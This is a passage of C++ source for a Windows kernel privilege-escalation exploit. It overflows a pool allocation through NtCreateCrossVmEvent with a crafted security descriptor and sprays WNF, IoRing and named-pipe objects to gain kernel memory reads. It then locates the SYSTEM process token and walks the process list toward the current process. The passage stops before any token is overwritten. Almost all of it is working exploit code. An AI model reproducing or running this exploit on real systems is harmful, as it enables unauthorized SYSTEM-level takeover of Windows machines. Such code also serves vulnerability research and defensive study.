    std::vector<WNF_STATE_NAME> statenames1(STATENAMES1_SIZE);
    std::vector<WNF_STATE_NAME> statenames2(STATENAMES2_SIZE);
    std::vector<WNF_STATE_NAME> statenames3(STATENAMES3_SIZE);
    //std::vector<WNF_STATE_NAME> statenames4(0x400);
    DWORD64 curpid = 0;
    curpid = GetCurrentProcessId();
    DWORD64 pid = 0;
    DWORD64 cur_token_ptr = 0;
    std::vector<std::shared_ptr<WNF_STATE_CORRUPTED>> corrupted;
    ULONG outsize = 0x30;
    //0x50*334 = 10040
    unsigned char* buffer = new unsigned char[0x10080];
    unsigned char* backup_buffer = new unsigned char[WNF_MAX_DATA_SIZE + 0x200];
    memset(buffer, 0x0, 0x10000);

    std::cout << "Preparing..." << std::endl;

    prepare();

    ////getchar();

    //crafting objects to trigger overflow
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    GetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pdacl, NULL, reinterpret_cast<PSECURITY_DESCRIPTOR*>(&psd));
    other_ace = reinterpret_cast<ACCESS_ALLOWED_ACE*>((char*)pdacl + sizeof(ACL));
    /* newace->Header.AceType = 0x0;
     newace->Header.AceSize = 0x2000;
     newace->Header.AceFlags = 0x0;
     newace->Mask = 0x001fffff;
     memcpy(newace, ace, ace->Header.AceSize);
     newace->Header.AceSize = 0x2000;*/

     /*if (!AddAce(pdacl, ACL_REVISION, 0, newace, 1)) {
         std::cout << "error adding ace" << std::endl;
     }*/
    sd.Dacl = static_cast<PACL>(VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    memset(sd.Dacl, 0x0, 0x10000);
    sd.Dacl->AclSize = ROUND_UP(0xfff0, 4);
    sd.Dacl->AclRevision = ACL_REVISION;
    sd.Dacl->AceCount = 1;

    ace = (ACCESS_ALLOWED_ACE*)(sizeof(ACL) + (char*)(sd.Dacl));

    memcpy(ace, other_ace, other_ace->Header.AceSize);
    //ace->Header.AceType = 0x0;
    ace->Header.AceSize = sd.Dacl->AclSize - sizeof(ACL);
    //ace->Header.AceFlags = 0x0;
    //ace->Mask = 0x001fffff;


    //setting ptr to first object of size 0x50 that can be overwritten with overflow
    unsigned char* ptr = (unsigned char*)(sd.Dacl) + 0x40;

    ULONG DataSize = 0x50 * 0x334; //to read all the tampered objects + 1 not tampered object

    //the overflow allows to overwrite the next (0xfff0-0x40)/0x50 = 0x332 objects

    int i = 0;
    while (1) {
        POOL_HEADER* ph = (POOL_HEADER*)(ptr + i * 0x50);
        if (ph < (POOL_HEADER*)(sd.Dacl) + 0x1000 - 0x10) {
            ph->BlockSize = 0x5;
            ph->PoolTag = 0x20666e57;
            ph->PoolType = 0xb & ~(1 << 3); //clear PoolQuota bit (bit index 3)
            ph->PoolIndex = 0x0;
            ph->PreviousSize = 0x0;
            ph->ProcessBilled = (PVOID)0x4242424242424242;
        }
        else {
            break;
        }
        WNF_STATE_DATA* wnf = (WNF_STATE_DATA*)(ptr + i * 0x50 + sizeof(POOL_HEADER));
        if (wnf < (WNF_STATE_DATA*)(sd.Dacl) + 0x1000 - 0x10) {
            wnf->DataSize = DataSize;
            wnf->AllocatedSize = wnf->DataSize;
            wnf->ChangeStamp = 1;
            unsigned char* data = (unsigned char*)wnf + sizeof(WNF_STATE_DATA);
            reinterpret_cast<DWORD64*>(data)[0] = i;
            DataSize -= 0x50;
        }
        else {
            break;
        }
        i++;
    }

      //set security descriptor in object attributes
    InitializeObjectAttributes(&oa, NULL, 0, NULL, &sd);
    sd.Control = 0x4;

    NtCreateCrossVmEvent fNtCreateCrossVmEvent = (NtCreateCrossVmEvent)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateCrossVmEvent"));

    if (!fNtCreateCrossVmEvent) {
        printf("[-] GetProcAddress failed (%d)\n", GetLastError());
        return 1;
    }
    std::cout << "[*] fNtCreateCrossVmEvent = " << std::hex << fNtCreateCrossVmEvent << std::endl;
    NtQueryInformationProcess fNtQueryInformationProcess = (NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));

    if (!fNtQueryInformationProcess) {
        printf("[-] GetProcAddress failed (%d)\n", GetLastError());
        return 1;
    }

    std::cout << "[*] fNtQueryInformationProcess = " << std::hex << fNtQueryInformationProcess << std::endl;

    hWinsbxclientproc = GetWinSBXCliProcHandle();

    if (hWinsbxclientproc == NULL) {
        printf("[!] WindowsSandboxClient.exe process not found\n");
        std::cout << "[*] spawning windows sandbox" << std::endl;

        if (!CreateProcessA("C:\\Windows\\System32\\WindowsSandbox.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            std::cout << "[-] CreateProcessA failed with error: " << GetLastError() << std::endl;
            return 1;
        }
        std::cout << "[*] CreateProcessA returned successfully" << std::endl;

        while (1) {
            Sleep(5000);
            hWinsbxclientproc = GetWinSBXCliProcHandle();
            if (hWinsbxclientproc != NULL && hWinsbxclientproc != INVALID_HANDLE_VALUE) {
                break;
            }
        }
    }

    if (hWinsbxclientproc == NULL) {
        printf("[-] WindowsSandboxClient.exe process not found\n");
        return 1;
    }

    if (fNtQueryInformationProcess(hWinsbxclientproc, ProcessBasicInformation, &pbi, sizeof(pbi), &ReturnLength) > 0) {
        std::cout << "[-] NtQueryInformationProcess failed with error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[*] NtQueryInformationProcess returned successfully" << std::endl;
    std::cout << "[*] peb_addr = " << std::hex << pbi.PebBaseAddress << std::endl;


    if (!ReadProcessMemory(hWinsbxclientproc, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] ReadProcessMemory returned successfully" << std::endl;
    std::cout << "[*] ProcessParameters = " << std::hex << peb.ProcessParameters << std::endl;

    if (!ReadProcessMemory(hWinsbxclientproc, peb.ProcessParameters, processParams, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] ReadProcessMemory returned successfully" << std::endl;
    std::cout << "[*] CommandLine = " << processParams->CommandLine.Buffer << std::endl;
    std::cout << "[*] CommandLine_size = " << processParams->CommandLine.MaximumLength << std::endl;

    wchar_t* commandline = new wchar_t[processParams->CommandLine.MaximumLength + 0x2];
    ZeroMemory(commandline, processParams->CommandLine.MaximumLength + 0x2);
    if (!ReadProcessMemory(hWinsbxclientproc, processParams->CommandLine.Buffer, commandline, processParams->CommandLine.MaximumLength, NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << "[*] commandline = " << commandline << std::endl;

    std::wstring commandline_wstr(commandline);
    delete[] commandline;

    //extracting guid
    std::wstring w_guid(commandline_wstr.substr(58, 36));

    std::wcout << "[*] extracted guid = " << w_guid << std::endl;

    // Calculating the length of the multibyte string
    size_t len = w_guid.length();
    char* s_guid = new char[len + 2];
    size_t returnedlength = 0;
    wcstombs_s(&returnedlength, s_guid, static_cast<size_t>(len + 2), w_guid.c_str(), len);

    std::cout << "[*] s_guid = " << s_guid << std::endl;
    HRESULT res = 0;

    wchar_t* ws = const_cast<wchar_t*>(w_guid.c_str());

    res = UuidFromStringW(reinterpret_cast<RPC_WSTR>(ws), &guid2);

    if (res != S_OK) {
        std::cout << "[-] IIDFromString failed with error: " << res << std::endl;
        return 1;
    }

    CoCreateGuid(&guid);
    //CoCreateGuid(&guid2);


    printf("Created GUID\n");

    //StringFromGUID2(guid, guidstr, 0x100);
    //StringFromGUID2(guid2, guidstr2, 0x100);

    std::cout << "extracted guid\n" << Hexdump(reinterpret_cast<unsigned char*>(&guid2), sizeof(guid2)) << std::endl << std::endl;
    std::cout << "guid\n" << Hexdump(reinterpret_cast<unsigned char*>(&guid2), sizeof(guid2)) << std::endl << std::endl;

    printf("Triggering vuln creating crossvmevent...\n");

    //////getchar();

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    //start spraying
    InitializeSecurityDescriptor(&sd_spraying, SECURITY_DESCRIPTOR_REVISION);

    memset(buffer, 0x41, 0x30);
    //first spraying
    for (auto& state : statenames1) {
        //std::cout << "state before creation: " << std::hex << state.Data[0] << state.Data[1] << std::endl;

        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;

        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);

    }

    //second spraying
    for (auto& state : statenames2) {
        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;
        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);
    }

    //holes in second spraying
    for (int i = STATENAMES2_SIZE - 0x100; i > 0; i -= 100) {
        result = fNtDeleteWnfStateData(&(statenames2[i]), NULL);
        //std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
        //std::cout << "freed state " << std::hex << statenames2[i].Data[0] << statenames2[i].Data[1] << std::endl;
    }
    //triggering overflow
    fNtCreateCrossVmEvent(&hEvent, EVENT_ALL_ACCESS, &oa, 0, &guid2, &guid2);

    //third spraying
    for (auto& state : statenames3) {
        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;
        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);
    }

    ////getchar();

    memset(buffer, 0x0, 0x10040);
    //retrieving corrupted WNFs
    for (auto& state : statenames2) {
        stamp = 0;
        outsize = 0x30;
        result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
            //std::cout << "outsize: " << std::hex << outsize << std::endl;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            //std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
            if (reinterpret_cast<DWORD64*>(buffer)[0] != 0x4141414141414141) {
                //std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                auto p = std::make_shared<WNF_STATE_CORRUPTED>(WNF_STATE_CORRUPTED{ state, reinterpret_cast<DWORD64*>(buffer)[0],outsize });
                corrupted.emplace_back(p);
            }
        }
    }
    std::sort(corrupted.begin(), corrupted.end(), [](std::shared_ptr<WNF_STATE_CORRUPTED> a, std::shared_ptr<WNF_STATE_CORRUPTED> b) {
        return a->val < b->val;
        });
    //std::cout << "ordered corrupted WNFs" << std::endl;

    for (auto& c : corrupted) {
        //std::cout << "state: " << std::hex << c->state.Data[0] << c->state.Data[1] << "\tval: " << std::hex << c->val << "\tdataSize: " << std::hex << c->dataSize << std::endl;
    }

    auto it = std::max_element(corrupted.begin(), corrupted.end(), [](std::shared_ptr<WNF_STATE_CORRUPTED> a, std::shared_ptr<WNF_STATE_CORRUPTED> b) {
        return a->dataSize < b->dataSize;
        });

    if (it == corrupted.end()) {
        std::cout << "no corrupted WNF" << std::endl;
        exit(0);
    }

    std::cout << "max corrupted WNF" << std::endl;
    std::cout << "state: " << std::hex << it->get()->state.Data[0] << it->get()->state.Data[1] << "\tval: " << std::hex << it->get()->val << "\tdataSize: " << std::hex << it->get()->dataSize << std::endl;

    auto max_corrupted = it->get();
    auto max_corrupted_datasize = max_corrupted->dataSize;
    memset(buffer, 0x0, 0x10040);

    std::cout << "calling NtqueryWnfStateData on max_corrupted with max_corrupted->state " << std::hex << max_corrupted->state.Data[0] << max_corrupted->state.Data[0] << " and datasize" << max_corrupted->dataSize << std::endl;
    result = fNtQueryWnfStateData(&(max_corrupted->state), NULL, NULL, &stamp, buffer, &(max_corrupted->dataSize));
    if (result != 0) {
        std::cout << "NtQueryWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
        exit(0);
    }
    std::cout << "buffer content" << std::endl;

    //std::cout << Hexdump(buffer, 0x150) << std::endl << std::endl;

    ////getchar();

    //setting ptr2 to beginning of next block
    auto ptr2 = buffer + 0x30;

    while (reinterpret_cast<DWORD64*>(ptr2)[0] == 0x0) {
        ptr2 += 0x8;
    }
    auto found_wnf = 0;
    while (reinterpret_cast<unsigned char*>(ptr2) < buffer + 0x10000 - 0x20) {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        //found WNF
        if (ph->PoolTag == 0x20666e57) {
            found_wnf = 1;
            break;
        }
        //Probably found a chunk at the end of a page. It has additional data set to 0. Skip it.
        else if (reinterpret_cast<DWORD64*>(ptr2)[0] == 0) {
            while (reinterpret_cast<DWORD64*>(ptr2)[0] == 0 && reinterpret_cast<unsigned char*>(ptr2) < buffer + 0x10000 - 0x20) {
                ptr2 += 0x8;
            }
        }
        else {
            ptr2 += 0x50;
        }
    }

    if (!found_wnf) {
        std::cout << "[-] not found WNF to be freed and replaced with RegBuffers" << std::endl;
        exit(0);
    }

    std::cout << "[+] found WNF to be freed and replaced with RegBuffers" << std::endl;

    offset = reinterpret_cast<unsigned char*>(ptr2) - buffer;

    std::cout << "offset " << std::hex << offset << std::endl;

    //I'll be able to fully control the token using the max_corrupted WNF
    if (offset + TARGET_SIZE < WNF_MAX_DATA_SIZE) {
        regBuffersControllerWNF = max_corrupted;
    }
    else {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        data = reinterpret_cast<DWORD64*>(ptr2 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));

        auto c = std::find_if(corrupted.begin(), corrupted.end(), [&data](std::shared_ptr<WNF_STATE_CORRUPTED>& c) {
            return c->val == data[0];
            });
        if (c != corrupted.end()) {
            regBuffersControllerWNF = c->get();
        }
    }

    if (regBuffersControllerWNF == NULL) {
        std::cout << "no regBuffersControllerWNF found" << std::endl;
        exit(0);
    }


    //doing first a backup for cleanup procedure
    memcpy(backup_buffer, buffer + offset - 0x30, WNF_MAX_DATA_SIZE);

    //overwriting next WNF value to understand what is to be freed
    //when freed, It will be replaced by a RegBuffers object if the exploit has success
    ph = reinterpret_cast<POOL_HEADER*>(ptr2);
    data = reinterpret_cast<DWORD64*>(ptr2 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
    data[0] = 0x4343434343434343;


    //setting ptr3 to next WNF
    ptr3 = ptr2 + 0x30;
    while (reinterpret_cast<DWORD64*>(ptr3)[0] == 0x0) {
        ptr3 += 0x8;
    }
    found_wnf = 0;

    while (reinterpret_cast<unsigned char*>(ptr3) < ptr2 + WNF_MAX_DATA_SIZE - 0x20) {
        POOL_HEADER* ph = reinterpret_cast<POOL_HEADER*>(ptr3);
        //found WNF
        if (ph->PoolTag == 0x20666e57) {
            found_wnf = 1;
            //DWORD64* data = reinterpret_cast<DWORD64*>(ptr3 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
            break;
        }
        //Probably found a chunk at the end of a page. It has additional data set to 0. Skip it.
        else if (reinterpret_cast<DWORD64*>(ptr3)[0] == 0) {
            while (reinterpret_cast<DWORD64*>(ptr3)[0] == 0 && reinterpret_cast<unsigned char*>(ptr3) < ptr2 + WNF_MAX_DATA_SIZE - 0x20) {
                ptr3 += 0x8;
            }
        }
        else {
            ptr3 += 0x50;
        }
    }

    if (!found_wnf) {
        std::cout << "[-] not found WNF to be freed and replaced with PipeAttribute" << std::endl;
        exit(0);
    }

    std::cout << "[+] found WNF to be freed and replaced with PipeAttribute" << std::endl;

    auto offset2 = reinterpret_cast<unsigned char*>(ptr3) - buffer;

    std::cout << "offset2 " << std::hex << offset2 << std::endl;

    //overwriting next WNF value to understand what is to be freed
    //when freed, It will be replaced by a PipeAtttribute object if the exploit has success

    ph = reinterpret_cast<POOL_HEADER*>(ptr3);
    data = reinterpret_cast<DWORD64*>(ptr3 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
    data[0] = 0x4444444444444444;

    std::cout << "updating regBuffersControllerWNF" << std::endl;

    //getchar();

    /*std::cout << "offset " << std::hex << offset << std::endl;
    std::cout << "buffer content" << std::endl;*/

    //std::cout << Hexdump(buffer, 0x100) << std::endl << std::endl;

    //stamp = 1;

    //std::cout << Hexdump(buffer + offset - 0x30, 0x1000) << std::endl << std::endl;
    std::cout << "calling NtUpdateWnfStateData on tokenReaderWNF->state " << std::hex << regBuffersControllerWNF->state.Data[0] << regBuffersControllerWNF->state.Data[0] << " and datasize" << regBuffersControllerWNF->dataSize << std::endl;
    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer + offset - 0x30, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
    }

    std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    fNtQueryWnfStateData(&(regBuffersControllerWNF->state), NULL, NULL, &stamp, buffer, &(regBuffersControllerWNF->dataSize));

    //std::cout << Hexdump(buffer, WNF_MAX_DATA_SIZE) << std::endl << std::endl;
    //getchar();
    //retrieving corrupted WNFs
    std::cout << "[*] retrieving WNF with content 0x4343434343434343" << std::endl;
    std::cout << "[*] retrieving WNF with content 0x4444444444444444" << std::endl;

    WNF_STATE_NAME to_free_WNF = { 0 };
    WNF_STATE_NAME to_free_WNF2 = { 0 };
    BOOL found1 = FALSE, found2 = FALSE;
    //auto max_to_free_wnfs = 0;

    std::cout << "searching in statenames2" << std::endl;
    for (auto& state : statenames2) {
        //stamp = 0;
        outsize = 0x30;
        result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
            //std::cout << "outsize: " << std::hex << outsize << std::endl;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            //std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
            if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                found1 = TRUE;
            }
            else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                found2 = TRUE;
            }
            if (found1 == TRUE && found2 == TRUE) {
                break;
            }
        }
    }
    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;
    if (!found1 || !found2) {
        std::cout << "searching in statenames3" << std::endl;
        for (auto& state : statenames3) {
            //stamp = 0;
            outsize = 0x30;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            if (result != 0) {
                //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
                //std::cout << "outsize: " << std::hex << outsize << std::endl;
                result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
                std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
                if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                    found1 = TRUE;
                }
                else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                    found2 = TRUE;
                }
                if (found1 == TRUE && found2 == TRUE) {
                    break;
                }
            }
        }
    }

    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;
    if (!found1 || !found2) {
        std::cout << "searching in statenames1" << std::endl;
        for (auto& state : statenames1) {
            //stamp = 0;
            outsize = 0x30;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            if (result != 0) {
                //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
                //std::cout << "outsize: " << std::hex << outsize << std::endl;
                result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
                std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
                if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                    found1 = TRUE;
                }
                else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                    found2 = TRUE;
                }
                if (found1 == TRUE && found2 == TRUE) {
                    break;
                }
            }
        }
    }

    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;

    if (!found1 || !found2) {
        std::cout << "[-] not found WNFs to be freed" << std::endl;
        exit(0);
    }

    result = fNtDeleteWnfStateData(&to_free_WNF, NULL);
    if (result != 0) {
        std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
    }


    //creating regBuffersArray with size 0x50 in PagedPool. Hopefully one will replace the freed WNF
    for (int i = 0; i < IORINGS_SIZE; i++) {
        UINT32 submitted = 0;
        result = SubmitIoRing(reinterpret_cast<HIORING>(iorings[i]), 0, INFINITE, &submitted);
        if (!SUCCEEDED(result)) {
            printf("[-] Failed SubmitIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    Sleep(5000);
    result = fNtDeleteWnfStateData(&to_free_WNF2, NULL);
    if (result != 0) {
        std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
    }


    //creating pipeAttributes with size 0x50 in PagedPool. Hopefully one will replace the freed WNF
    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        result = fNtFsControlFile(spray_pipes[i].pipe_write,
            NULL,
            NULL,
            NULL,
            &status,
            0x11003C,
            attribute,
            attribute_size,
            output,
            output_size
        );
        if (result != 0) {
            std::cout << "[-] fNtFsControlFile failed with error 0x" << std::hex << result << std::endl;
        }
    }


    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);

    //std::cout << "reading RegBuffersArray and pipe attribute" << std::endl;

    //getchar();
    //stamp = 0;
    result = fNtQueryWnfStateData(&(regBuffersControllerWNF->state), NULL, NULL, &stamp, buffer, &(regBuffersControllerWNF->dataSize));
    if (result != 0) {
        std::cout << "NtQueryWnfStateData on regBuffersControllerWNF returned " << std::hex << result << std::endl;
        exit(0);
    }
    //std::cout << "buffer content" << std::endl;

    std::cout << Hexdump(buffer, 0x150) << std::endl << std::endl;

    //getchar();

    found1 = 0, found2 = 0;
    ptr2 = buffer;
    auto regbuffersobject_ptr = ptr2;
    auto pipeattributeobject_ptr = ptr2;

    while (ptr2 < buffer + regBuffersControllerWNF->dataSize - sizeof(POOL_HEADER)) {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        if (ph->PoolTag == REGBUFFERS_TAG) {
            found1 = 1;
            regbuffersobject_ptr = ptr2;
        }
        else if (ph->PoolTag == PIPEATTRIBUTE_TAG) {
            found2 = 1;
            pipeattributeobject_ptr = ptr2;
        }
        if (found1 && found2) {
            break;
        }
        ptr2 += 0x8;
    }

    if (found1 == FALSE) {
        std::cout << "[-] regBuffers not found" << std::endl;
        exit(0);
    }

    if (found2 == FALSE) {
        std::cout << "[-] pipeAttributes not found" << std::endl;
        exit(0);
    }

    std::cout << "[+] regBuffers found and can be overwritten" << std::endl;
    std::cout << "[+] pipeAttribute found and can be read" << std::endl;

    //getting original kernel address of IOP_MC_BUFFER_ENTRY struct and saving in original_regBufferEntry
    auto original_regBufferEntry = *(reinterpret_cast<DWORD64*>(regbuffersobject_ptr + sizeof(_POOL_HEADER)));
    //getting address of PipeAttribute.ListEntry.Flink
    auto pipeAttributeFlink = *(reinterpret_cast<DWORD64*>(pipeattributeobject_ptr + sizeof(_POOL_HEADER)));

    auto fileObject_ptr = pipeAttributeFlink - ROOT_PIPE_ATTRIBUTE_OFFSET + FILE_OBJECT_OFFSET;
    std::cout << "[*] original_regBufferEntry: " << std::hex << original_regBufferEntry << std::endl;
    std::cout << "[*] pipeAttributeFlink: " << std::hex << pipeAttributeFlink << std::endl;

    IOP_MC_BUFFER_ENTRY** regBuffersAddr = reinterpret_cast<PIOP_MC_BUFFER_ENTRY*>(regbuffersobject_ptr + sizeof(POOL_HEADER));

    regBuffersAddr[0] = fake_bufferentry;

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on tokenControllerWNF returned " << std::hex << result << std::endl;
    }

    //std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    //getchar();

    auto test_targetAddress = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(test_targetAddress, 0x1000);
    memset(test_targetAddress, 0x80, 0x1000);

    for (int i = 0; i < IORINGS_SIZE; i++) {
        targetHandle = reinterpret_cast<HIORING>(iorings[i]);
        KRead((PVOID)fileObject_ptr, reinterpret_cast<PBYTE>(&fileObject), sizeof(fileObject));
        if (fileObject != 0x4141414141414141) {
            std::cout << "[+] found target handle" << std::endl;
            std::cout << "[*] targetHandle: " << std::hex << targetHandle << std::endl;
            std::cout << "[*] ioring index: " << std::dec << i << std::endl;
            std::cout << "[*] fileObject: " << std::hex << fileObject << std::endl;
            break;
        }
    }

    //get deviceObject
    KRead((PVOID)(fileObject + 0x8), reinterpret_cast<PBYTE>(&deviceObject), sizeof(deviceObject));
    //std::cout << "[*] deviceObject: " << std::hex << deviceObject << std::endl;

    //get driverObject
    KRead((PVOID)(deviceObject + 0x8), reinterpret_cast<PBYTE>(&driverObject), sizeof(driverObject));
    //std::cout << "[*] driverObject: " << std::hex << deviceObject << std::endl;

    //get Npfs!NpFsdCreate
    KRead((PVOID)(driverObject + 0x70), reinterpret_cast<PBYTE>(&pNpFsdCreate), sizeof(pNpFsdCreate));
    //std::cout << "[*] Npfs!NpFsdCreate: " << std::hex << pNpFsdCreate << std::endl;
    std::cout << "[*] base of npfs.sys: " << std::hex << pNpFsdCreate - NPFS_NPFSDCREATE_OFFSET << std::endl;

    //get ExAllocatePool2
    KRead((PVOID)(pNpFsdCreate - NPFS_NPFSDCREATE_OFFSET + NPFS_GOT_ALLOCATEPOOL2_OFFSET), reinterpret_cast<PBYTE>(&pExAllocatePool2), sizeof(pExAllocatePool2));
    //std::cout << "[*] ExAllocatePool2 : " << std::hex << pExAllocatePool2 << std::endl;
    std::cout << "[*] base of ntoskrnl.exe: " << std::hex << pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET << std::endl;
    //std::cout << "[*] system EPROCESS ptr: " << std::hex << pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET + NT_INITIALSYSTEMPROCESS_OFFSET << std::endl;

    //get system EPRCOESS
    KRead((PVOID)(pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET + NT_INITIALSYSTEMPROCESS_OFFSET), reinterpret_cast<PBYTE>(&system_eproc), sizeof(system_eproc));
    std::cout << "[*] system EPROCESS: " << std::hex << system_eproc << std::endl;

    KRead((PVOID)(system_eproc + EPROCESS_TOKEN_OFFSET), reinterpret_cast<PBYTE>(&system_token), sizeof(system_token));
    system_token &= 0xfffffffffffffff0;
    std::cout << "[*] system TOKEN: " << std::hex << system_token << std::endl;


    std::cout << "[*] curpid: " << curpid << std::endl;

    cur_eproc = system_eproc;
    while (1) {
        //std::cout << "[*] cur_eproc: " << std::hex << cur_eproc << std::endl;
        KRead((PVOID)(cur_eproc + EPROCESS_UNIQUEPROCESSID_OFFSET), reinterpret_cast<PBYTE>(&pid), sizeof(pid));
        //std::cout << "[*] pid: " << pid << std::endl;
        if (pid == curpid) {
            break;
        }
        KRead((PVOID)(cur_eproc + EPROCESS_FLINK_OFFSET), reinterpret_cast<PBYTE>(&cur_eproc), sizeof(cur_eproc));
        cur_eproc -= EPROCESS_FLINK_OFFSET;
    }

